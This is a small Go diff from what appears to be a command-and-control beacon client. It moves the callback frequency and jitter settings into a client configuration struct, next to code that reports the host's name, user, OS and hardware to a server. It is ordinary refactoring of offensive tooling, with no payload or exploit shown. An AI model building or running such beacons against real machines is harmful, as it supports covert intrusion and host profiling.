@@ -44,7 +44,7 @@ func main() {
 		logger.Logf(logger.Info, "Beacon connected")
 
 		ip := client_utils.GetLocalIP(beacon)
-		nextCallback := client_utils.CalculateNextCallbackTime(CallbackFrequency, CallbackJitter)
+		nextCallback := client_utils.CalculateNextCallbackTime(*client_utils.ClientConfig.CallbackFrequency, *client_utils.ClientConfig.CallbackJitter)
 		err = client_utils.HandleConfigurationRequest(
 			beacon, agentID, hostname, username, ip,
 			osType, osArch, osVersion, cpus, memory,
